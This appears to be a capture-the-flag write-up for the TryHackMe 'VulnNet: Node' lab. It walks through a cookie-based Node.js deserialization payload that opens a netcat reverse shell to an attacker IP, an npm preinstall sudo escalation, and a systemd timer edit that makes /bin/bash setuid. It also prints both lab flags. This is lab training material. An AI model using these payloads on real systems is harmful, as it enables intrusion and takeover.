---
title: Vulnet:Node
layout: post
author: Bit Criminals Team
date: 2021-05-06 17:02:00 +0530
type: Pentesting
difficulty: Easy
prompt: https://tryhackme.com/room/vulnnetnode
---

So we run a full Nmap scan to see which ports are open,and we see that only one port is open.

```py
PORT     STATE SERVICE REASON  VERSION
8080/tcp open  http    syn-ack Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
```
And since a tcp port is open we run our routine gobuster scan , which shows us that these directories are present.

![](/images/MaskdMafia/node1.png)

Meanwhile,opening the website on our browser we are greeted with this page.

![](/images/MaskdMafia/node2.png)

And inspecting the page we see that it has a base64 encoded cookie , which , on decrypting gives this:

```py
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
```
On changing the value of Username from "Guest" to "Admin" shows us "Welcome Admin" on the page.
However,changing the cookie value to anything else shows us errors

![](/images/MaskdMafia/node-3.png)

So we decide to put a reverse shell in the Username field, which gives us access to the machine .

```py
{"username":"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 
2>&1|nc 10.9.8.34 1337 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) })",
"isGuest":true,"encoding": "utf-8"}
```
![](/images/MaskdMafia/node-4.png)

So we try to see what commands we are allowed to execute as www

![](/images/MaskdMafia/node5.png)

Searching for an npm exploit on GTFOBins we get one result so lets try it out !

So we run these two commands on the machine:

```py
echo '{"scripts": {"preinstall": "/bin/sh"}}' > package.json
sudo -u serv-manage /usr/bin/npm -C ./ --unsafe-perm i
```
Lets see if it worked.

![](/images/MaskdMafia/node6.png)

Yay! We are now serv-manage.We now go to /home/serv-manage to get our user.txt.

User-Flag: THM{064640a2f880ce9ed7a54886f1bde821}

Next we need to get root privileges.So we run sudo -l to see which commands the user serv-manage is allowed to execute.

![](/images/MaskdMafia/node7.png)

So we go to the directory which has vulnnet-auto.timer and write the following to the files after stopping the vulnet-auto.timer.

```py
echo '[Unit]
Description=Run VulnNet utilities every 30 min
[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/1
Unit=vulnnet-job.service
[Install]
WantedBy=basic.target' > vulnnet-auto.timer
```

```py
echo '[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/bash -c "chmod +s /bin/bash"

[Install]
WantedBy=multi-user.target' > vulnnet-job.service
```

After that we run the following commands:

```py
sudo /bin/systemctl stop vulnnet-auto.timer
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl start vulnnet-auto.timer
```

Waited sometime and we got the root priveleges !
Now we go to the root directory and see the contents of root.txt.

![](/images/MaskdMafia/node-8.png)

Root Flag: THM{abea728f211b105a608a720a37adabf9}



